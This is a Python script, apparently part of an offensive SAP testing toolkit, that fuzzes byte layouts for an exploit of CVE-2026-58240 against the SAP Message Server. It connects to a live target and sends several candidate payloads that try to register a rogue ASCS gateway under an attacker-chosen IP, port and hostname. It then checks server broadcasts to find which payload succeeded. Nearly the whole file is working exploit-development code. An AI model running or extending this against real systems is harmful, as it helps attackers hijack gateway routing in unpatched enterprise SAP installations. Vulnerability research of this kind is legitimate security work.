#!/usr/bin/env python3
"""cve_58240_fuzzer.py — MS_ASCS_GW_LOGON payload byte-layout fuzzer.

Live-driven reverse engineering of the CVE-2026-58240 opcode 0x52
payload.  The register step of SAPMAP's PoC accepts the packet
(opc_err=0) on unpatched targets but the server does NOT broadcast a
new ASCS_GW state that reflects our forged values.  Almost certainly
means our TLV byte layout is wrong — the server parses "far enough
to say opcode understood" but the field extractor gives back nothing
useful.

Strategy:
- Send N candidate payload shapes back-to-back against the same
  target, each with unique markers (rogue port + rogue hostname).
- For every shape, log EVERY server reply for a fixed window.
- Highlight any reply whose payload contains our unique markers —
  that would be the `MsSSndAscsGwInfo` broadcast confirming the
  write succeeded, and therefore the correct payload shape.

Usage:
    python3 tools/cve_58240_fuzzer.py <host> [port] [--timeout 6]
                                       [--dump-all]

    python3 tools/cve_58240_fuzzer.py 10.10.0.27 3901 --dump-all

Zero external deps.  Reuses SAPMAP's stdlib NI framing / MS header
helpers, so the SAPMAP repo must be on the Python path (run this
script from the repo root or export PYTHONPATH).
"""
from __future__ import annotations

import argparse
import os
import socket
import struct
import sys
import time
from typing import Callable

# Make SAPMAP's flat imports work when running from the repo root.
_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, _ROOT)
import modules   # registers subdir paths
import sap_ms_betrusted as ms


MS_OPCODE_ASCS_GW_LOGON     = 0x52
MS_OPCODE_ASCS_GW_STATUS    = 0x53
MS_OPCODE_ASCS_GW_KEEPALIVE = 0x54


# ---------------------------------------------------------------------------
# Payload shape candidates
# ---------------------------------------------------------------------------
#
# Each candidate takes (rogue_host, rogue_port, attacker_ip, pid) and
# returns the payload bytes to be appended after the 4-byte opcode
# section of an MS request.  Each shape carries a rationale so it's
# obvious which hypothesis it tests.

def _pad(b: bytes, n: int, fill=b"\x00") -> bytes:
    return b[:n] + fill * max(0, n - len(b))


def shape_tlv_current(host, port, ip, pid):
    """Baseline: SAPMAP's current TLV shape (known accepted but no
    broadcast reflection)."""
    host_b = host.encode("ascii")[:80]
    pid_b  = str(pid).encode("ascii")
    p  = struct.pack("!H", 0x0001)
    p += struct.pack("!H", port)
    p += socket.inet_aton(ip)
    p += struct.pack("!H", len(host_b)) + host_b
    p += struct.pack("!H", len(pid_b))  + pid_b
    p += b"\xff\xff"
    return p


def shape_redrays_partial(host, port, ip, pid):
    """From the RedRays screenshot fragment: `03 00 00 00 00 00 00 <port_be_2>
    <mystery>...`.  Hypothesis: byte 0 is a record marker, bytes 1-6
    are reserved zeros, then port (BE), then host, then ip, pid."""
    p  = bytes([0x03]) + b"\x00" * 6
    p += struct.pack("!H", port)
    p += _pad(host.encode("ascii"), 40, b"\x00")
    p += socket.inet_aton(ip)
    p += struct.pack("!I", pid)
    return p


def shape_status_reply_replay(host, port, ip, pid):
    """Replay the shape of the server's STATUS-reply payload but with
    our own values injected.  IDE returned this on opcode 82:
        03 03 00 00 00 00 00 00 00 01 00 00 00 00 02 00
        00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00
        00 00 00 00 00
    Structural guess: <type=3><ver=3><pad*6><rec1: 00 01 pp pp pp pp>
    <rec2: 00 02 <hostname>> <rec3: 00 04 <ip>>."""
    p  = bytes([0x03, 0x03]) + b"\x00" * 6
    p += bytes([0x00, 0x01]) + struct.pack("!I", port)          # rec1
    p += bytes([0x00, 0x02]) + _pad(host.encode("ascii"), 40)   # rec2
    p += bytes([0x00, 0x04]) + socket.inet_aton(ip)             # rec3
    return p


def shape_setlogon_family(host, port, ip, pid):
    """MS_SET_LOGON (opcode 0x06) layout — a nearby write opcode.
    <type: uint16><port: uint16><addr: 4><name_len: uint16>
    <name_len bytes><prot_len: uint16><host_len: uint16><host>
    <misc_len: uint16><addr6_len_sentinel: 0xffff>"""
    host_b = host.encode("ascii")[:80]
    p  = struct.pack("!H", 0x0001)     # logon type
    p += struct.pack("!H", port)
    p += socket.inet_aton(ip)
    p += struct.pack("!H", 0)          # logonname_length
    p += struct.pack("!H", 0)          # prot_length
    p += struct.pack("!H", len(host_b)) + host_b
    p += struct.pack("!H", 0)          # misc_length
    p += b"\xff\xff"                    # sentinel
    return p


def shape_fixed_struct_no_length(host, port, ip, pid):
    """Fixed-width MSADM-style record: 32-byte host + 4-byte port
    + 4-byte ip + 4-byte pid, no length prefixes."""
    p  = _pad(host.encode("ascii"), 32)
    p += struct.pack("!I", port)
    p += socket.inet_aton(ip)
    p += struct.pack("!I", pid)
    return p


def shape_fixed_struct_with_marker(host, port, ip, pid):
    """Same fixed-width struct but with the 0x03 record marker prefix
    from the STATUS reply."""
    p  = bytes([0x03, 0x00, 0x00, 0x00])
    p += _pad(host.encode("ascii"), 32)
    p += struct.pack("!I", port)
    p += socket.inet_aton(ip)
    p += struct.pack("!I", pid)
    return p


def shape_le_variants(host, port, ip, pid):
    """Same as tlv_current but with little-endian shorts — SAP MS
    on some kernels uses LE for the ASCS_GW opcodes."""
    host_b = host.encode("ascii")[:80]
    pid_b  = str(pid).encode("ascii")
    p  = struct.pack("<H", 0x0001)
    p += struct.pack("<H", port)
    p += socket.inet_aton(ip)
    p += struct.pack("<H", len(host_b)) + host_b
    p += struct.pack("<H", len(pid_b))  + pid_b
    p += b"\xff\xff"
    return p


def shape_null_terminated_strings(host, port, ip, pid):
    """Null-terminated ASCII fields — common in old SAP wire formats.
    <type=1><port_be><ip><NUL-term host><NUL-term pid>"""
    p  = struct.pack("!H", 0x0001)
    p += struct.pack("!H", port)
    p += socket.inet_aton(ip)
    p += host.encode("ascii") + b"\x00"
    p += str(pid).encode("ascii") + b"\x00"
    return p


def shape_empty(host, port, ip, pid):
    """Baseline: empty payload — used for identity leak in check phase."""
    return b""


CANDIDATES: list[tuple[str, Callable]] = [
    ("empty",                   shape_empty),
    ("tlv_current",             shape_tlv_current),
    ("redrays_partial",         shape_redrays_partial),
    ("status_reply_replay",     shape_status_reply_replay),
    ("setlogon_family",         shape_setlogon_family),
    ("fixed_struct_no_length",  shape_fixed_struct_no_length),
    ("fixed_struct_with_marker",shape_fixed_struct_with_marker),
    ("le_variants",             shape_le_variants),
    ("null_terminated_strings", shape_null_terminated_strings),
]


# ---------------------------------------------------------------------------
# One probe run
# ---------------------------------------------------------------------------

def _send_opcode(sock, key: bytes, opcode: int, body: bytes,
                  probe_name: str) -> None:
    hdr = ms.ms_build_header(
        toname="MSG_SERVER", fromname=probe_name,
        msgtype=ms.MSG_DIA, flag=ms.FLAG_REQUEST,
        iflag=ms.IFLAG_SEND_NAME, key=key)
    opc = struct.pack("BBBB", opcode, 1, 0, 0)
    ms.ni_send(sock, hdr + opc + body)


def _drain(sock, window: float) -> list[bytes]:
    """Collect every reply frame the server sends within `window` seconds."""
    replies = []
    deadline = time.time() + window
    while time.time() < deadline:
        remaining = deadline - time.time()
        r = ms.ni_try_recv(sock, timeout=max(0.1, remaining))
        if r is None:
            break
        replies.append(r)
    return replies


def _reply_summary(r: bytes) -> str:
    hdr = ms.ms_parse_header(r) or {}
    opc = ms.ms_parse_opcode(r) if len(r) >= 114 else {}
    return (f"{len(r)}B msgtype=0x{hdr.get('msgtype', 0):02x} "
            f"flag=0x{hdr.get('flag', 0):02x} "
            f"iflag=0x{hdr.get('iflag', 0):02x} "
            f"to={hdr.get('toname', ''):>12s} "
            f"from={hdr.get('fromname', ''):>12s} "
            f"opcode=0x{opc.get('opcode', 0):02x} "
            f"err={opc.get('error', 0)}")


def _has_marker(reply: bytes, markers: list[bytes]) -> list[bytes]:
    return [m for m in markers if m in reply]


def run_candidate(host: str, port: int, name: str, builder: Callable,
                    args, dump_all: bool) -> dict:
    """One probe: LOGIN_2 → opcode 82 with this shape → drain replies."""
    result = {"name": name, "err": "", "hit_markers": [], "replies": 0}
    # Unique markers per attempt so we can cross-attempt distinguish.
    tag = os.urandom(2).hex().upper()
    rogue_host = f"SAPMAP_{tag}"
    # Unique port + a fake attacker IP that won't collide with anything else.
    rogue_port = args.rogue_port_base + hash(name) % 100
    attacker_ip = f"10.99.{sum(bytearray(name.encode()))%255}.42"
    markers = [
        rogue_host.encode("ascii"),
        struct.pack("!H", rogue_port),   # BE port
        struct.pack("<H", rogue_port),   # LE port
        socket.inet_aton(attacker_ip),   # attacker ip
    ]
    payload = builder(rogue_host, rogue_port, attacker_ip, 1)

    probe_name = f"fuzz_{tag}"
    try:
        sock = socket.create_connection((host, port), timeout=args.timeout)
        sock.settimeout(args.timeout)
    except OSError as e:
        result["err"] = f"connect: {e}"
        return result
    try:
        ms.ni_send(sock, ms.pkt_login_2(probe_name))
        r = ms.ni_try_recv(sock, timeout=args.timeout)
        if r is None:
            result["err"] = "no LOGIN_2 reply"
            return result
        hdr = ms.ms_parse_header(r)
        if not hdr or hdr["errorno"]:
            result["err"] = f"LOGIN_2 errno={hdr.get('errorno', -1)}"
            return result
        key = hdr["key"]

        # Fire the LOGON with THIS shape.
        _send_opcode(sock, key, MS_OPCODE_ASCS_GW_LOGON, payload, probe_name)
        replies = _drain(sock, args.reply_window)
        result["replies"] = len(replies)

        print(f"\n=== {name:<26s} payload={len(payload):>3d}B  "
              f"host={rogue_host}  port={rogue_port}  ip={attacker_ip} ===")
        print(f"    payload hex: {payload.hex()}")
        for i, rep in enumerate(replies, 1):
            hits = _has_marker(rep, markers)
            marker_note = ""
            if hits:
                marker_note = "  <-- HIT: " + ", ".join(m.hex() for m in hits)
                result["hit_markers"].extend(m.hex() for m in hits)
            print(f"    reply {i}: {_reply_summary(rep)}{marker_note}")
            if dump_all and len(rep) > 110:
                body = rep[110 + 4:]
                # print the payload past the opcode section
                if body:
                    print(f"      body({len(body)}B): {body[:96].hex()}"
                          + (" ..." if len(body) > 96 else ""))

        # Clean LOGOUT to reset the server's per-source-IP client cache
        # before the next iteration.
        try:
            ms.ni_send(sock, ms.pkt_logout(probe_name, key))
        except OSError:
            pass
    finally:
        try: sock.close()
        except Exception: pass
    return result


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("host")
    ap.add_argument("port", type=int, nargs="?", default=3901)
    ap.add_argument("--timeout", type=float, default=6.0,
                     help="socket timeout per candidate (default: 6s)")
    ap.add_argument("--reply-window", type=float, default=2.5,
                     help="how long to drain server replies after each "
                          "LOGON (default: 2.5s)")
    ap.add_argument("--rogue-port-base", type=int, default=31300,
                     help="each candidate uses base + hash(name) % 100")
    ap.add_argument("--dump-all", action="store_true",
                     help="hex-dump the FULL body of every reply, not "
                          "just the summary line")
    ap.add_argument("--inter-run-sleep", type=float, default=1.0,
                     help="seconds to sleep between candidates so the "
                          "server's client cache ages out (default: 1s)")
    args = ap.parse_args()

    print(f"[*] fuzzing {args.host}:{args.port} with "
          f"{len(CANDIDATES)} payload shape(s)")
    print(f"[*] each candidate uses a unique tag / port / IP so we can "
          f"spot which one gets echoed back by the server")
    print(f"[*] reply-window={args.reply_window}s, "
          f"inter-run-sleep={args.inter_run_sleep}s")

    results = []
    for name, builder in CANDIDATES:
        r = run_candidate(args.host, args.port, name, builder, args,
                            args.dump_all)
        results.append(r)
        time.sleep(args.inter_run_sleep)

    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    for r in results:
        icon = "!" if r["hit_markers"] else " "
        print(f"  [{icon}] {r['name']:<28s} replies={r['replies']:<3d} "
              f"markers_hit={r['hit_markers'] or 'none':<32s}"
              + (f" err={r['err']}" if r["err"] else ""))
    hits = [r for r in results if r["hit_markers"]]
    print()
    if hits:
        print(f"[+] {len(hits)} candidate(s) produced a marker echo — "
              f"the winner is the shape that registers our rogue "
              f"gateway.  Verify by checking that the server broadcast "
              f"our unique hostname AND rogue port back at us.")
    else:
        print("[-] No candidate produced a marker echo.  Options:")
        print("      1. Rerun with --dump-all and eyeball each body")
        print("      2. Increase --reply-window (some kernels delay "
              "broadcasts to subscribers)")
        print("      3. Add more shapes — try inspecting the RedRays "
              "PoC bytes if available")
        print("      4. Confirm the target is really unpatched (kernel "
              "PL below fix level)")


if __name__ == "__main__":
    main()
